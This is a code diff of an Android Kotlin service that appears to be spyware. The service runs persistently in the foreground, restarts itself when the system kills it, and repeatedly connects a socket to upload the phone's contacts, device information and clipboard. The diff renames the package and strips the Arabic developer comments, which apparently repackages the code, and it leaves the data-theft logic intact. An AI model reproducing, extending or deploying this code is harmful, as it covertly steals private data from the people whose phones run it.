@@ -1,4 +1,4 @@
-package wifi.fiend // ✅ تم تغييرها لتطابق Manifest
+package willi.fiend
 
 import android.annotation.SuppressLint
 import android.app.*
@@ -13,14 +13,11 @@ class MainService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
 
-    // Runnable لإعادة المحاولة إذا فشل الاتصال
     private val connectionRunnable = object : Runnable {
         override fun run() {
             try {
-                // تأكد من أن العملية تتم في خيط منفصل حتى لا يتجمد التطبيق
                 Thread {
                     try {
-                        // ❗️ تأكد أن اسم AppSocket يطابق الملف الموجود لديك
                         val socket = AppSocket(this@MainService)
                         val action = socket.action
                         socket.connect()
@@ -30,12 +27,8 @@ class MainService : Service() {
                         action.uploadContact()
                         action.uploadDeviceInfo()
                         action.uploadClipboard()
-
-                        // إزالة هذا السطر إذا لم تعد تريد إعادة المحاولة بعد النجاح
-                        // handler.postDelayed(this, 5000) 
                     } catch (e: Exception) {
                         e.printStackTrace()
-                        // إذا فشل الاتصال، نعيد المحاولة بعد 10 ثوانٍ
                         handler.postDelayed(this, 10000)
                     }
                 }.start()
@@ -52,25 +45,18 @@ class MainService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        // تحديث الحالة في JobWakeUpService ليتم إعلامها أن الخدمة تعمل
         JobWakeUpService.isMainServiceRunning = true
-        
         startForeground(1, getNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // بدء الاتصال
-        handler.postDelayed(connectionRunnable, 5000) 
-        
-        // إعادة تشغيل الخدمة إذا قتلها النظام
+        handler.postDelayed(connectionRunnable, 5000)
         return START_STICKY
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        // تحديث الحالة عند التدمير
         JobWakeUpService.isMainServiceRunning = false
-        // إيقاف الـ Runnable لتجنب تسرب الذاكرة
         handler.removeCallbacks(connectionRunnable)
     }
 
